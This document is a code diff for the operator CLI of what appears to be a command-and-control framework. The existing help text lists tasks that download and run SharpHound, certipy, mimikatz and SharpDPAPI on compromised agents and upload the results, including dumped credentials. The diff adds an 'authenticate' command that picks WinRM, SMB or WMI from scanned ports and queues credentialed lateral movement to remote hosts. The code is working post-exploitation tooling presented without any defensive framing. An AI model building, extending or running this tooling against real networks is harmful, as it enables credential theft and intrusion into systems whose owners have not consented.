@@ -13,15 +13,19 @@ Global mode:
   exit / quit                 — exit the CLI
 
 Interact mode  (prompt changes to [agent_id] >):
-  <command>                   — queue a shell task (default)
-  shell <command>             — queue a shell task (explicit)
-  recon <ip_or_cidr>          — queue a recon scan
-  sharphound                  — download + run SharpHound, upload ZIP
-  certipy <args>              — download certipy.exe + run, upload output files (ADCS enum)
-  secretsdump <tool> <args>   — download tool + run (e.g. mimikatz.exe args)
-  dpapi <tool> <args>         — download tool + run (e.g. SharpDPAPI.exe args)
-  results                     — show task results for this agent
-  back                        — return to global mode
+  <command>                                      — queue a shell task (default)
+  shell <command>                                — queue a shell task (explicit)
+  recon <ip_or_cidr>                             — queue a recon scan
+  sharphound                                     — download + run SharpHound, upload ZIP
+  certipy <args>                                 — download certipy.exe + run, upload output files (ADCS enum)
+  secretsdump <tool> <args>                      — download tool + run (e.g. mimikatz.exe args)
+  dpapi <tool> <args>                            — download tool + run (e.g. SharpDPAPI.exe args)
+  authenticate -u <user> -p <pass> [-s <svc>] <target_ip>
+                                                 — authenticate to a remote host using a native Windows service
+                                                   auto-selects service from recon data (winrm / smb / wmi)
+                                                   use -s to force a specific service
+  results                                        — show task results for this agent
+  back                                           — return to global mode
 """
 
 import sys
@@ -30,6 +34,9 @@ import time
 import requests
 
 SERVER = "http://127.0.0.1:8080"
+
+# Ports that indicate a usable lateral movement service
+LATERAL_PORTS = {5985: "winrm", 5986: "winrm", 445: "smb", 135: "wmi"}
 
 
 # ── HTTP helpers ──────────────────────────────────────────────────────────────
@@ -146,6 +153,47 @@ def _print_loot(data):
         print(f"  {agent_id}:")
         for f in files:
             print(f"    - {f}")
+
+
+# ── Authenticate helpers ──────────────────────────────────────────────────────
+
+def _parse_auth_args(arg):
+    """Parse: -u user -p password [-s service] target  →  (username, password, target, service|None)"""
+    tokens = arg.split()
+    username = password = target = service = None
+    i = 0
+    while i < len(tokens):
+        if tokens[i] == "-u" and i + 1 < len(tokens):
+            username = tokens[i + 1]; i += 2
+        elif tokens[i] == "-p" and i + 1 < len(tokens):
+            password = tokens[i + 1]; i += 2
+        elif tokens[i] == "-s" and i + 1 < len(tokens):
+            service = tokens[i + 1].lower(); i += 2
+        else:
+            target = tokens[i]; i += 1
+    return username, password, target, service
+
+
+def _services_for_target(target_ip):
+    """
+    Look up target_ip in the hosts table and return the list of lateral movement
+    services available based on open ports.
+    Returns [] if the host is known but no lateral ports are open.
+    Returns None if the host is not in the DB at all.
+    """
+    hosts = _get("/hosts")
+    if not hosts:
+        return None
+    for h in hosts:
+        if h["ip"] == target_ip:
+            open_ports = [int(p) for p in h.get("open_ports", "").split(",") if p.strip().isdigit()]
+            services = []
+            for port in open_ports:
+                svc = LATERAL_PORTS.get(port)
+                if svc and svc not in services:
+                    services.append(svc)
+            return services
+    return None  # not found in DB
 
 
 # ── Global commands ───────────────────────────────────────────────────────────
@@ -275,6 +323,39 @@ def handle_interact(line, agent_id):
             if res:
                 print(f"[+] DPAPI task queued — task_id: {res['task_id']}")
                 _wait_for_result(agent_id, res["task_id"], timeout=120)
+
+    elif cmd == "authenticate":
+        if not arg:
+            print("usage: authenticate -u <user> -p <pass> [-s winrm|smb|wmi] <target_ip>")
+        else:
+            username, password, target, service = _parse_auth_args(arg)
+
+            if not username or not password or not target:
+                print("[-] Missing arguments. usage: authenticate -u <user> -p <pass> [-s winrm|smb|wmi] <target_ip>")
+            else:
+                # If service not forced, resolve it from recon data
+                if not service:
+                    available = _services_for_target(target)
+
+                    if available is None:
+                        print(f"[-] No recon data for {target} — run 'recon' first or specify a service with -s [winrm|smb|wmi]")
+                    elif len(available) == 0:
+                        print(f"[-] No lateral movement ports found for {target} in recon data")
+                    elif len(available) == 1:
+                        service = available[0]
+                        print(f"[*] {service.upper()} detected on {target} — using {service}")
+                    else:
+                        svcs = ", ".join(available)
+                        print(f"[*] Multiple services available on {target}: {svcs}")
+                        print(f"[!] Please specify a service: authenticate -u {username} -p <pass> -s [{' | '.join(available)}] {target}")
+                        service = None  # abort, let operator retry with -s
+
+                if service:
+                    instruction = f"{username}|{password}|{target}|{service}"
+                    res = _post("/task", {"agent_id": agent_id, "task_type": "authenticate", "instruction": instruction})
+                    if res:
+                        print(f"[+] Authenticate task queued — task_id: {res['task_id']}")
+                        _wait_for_result(agent_id, res["task_id"], timeout=30)
 
     elif cmd == "shell":
         command = arg if arg else ""
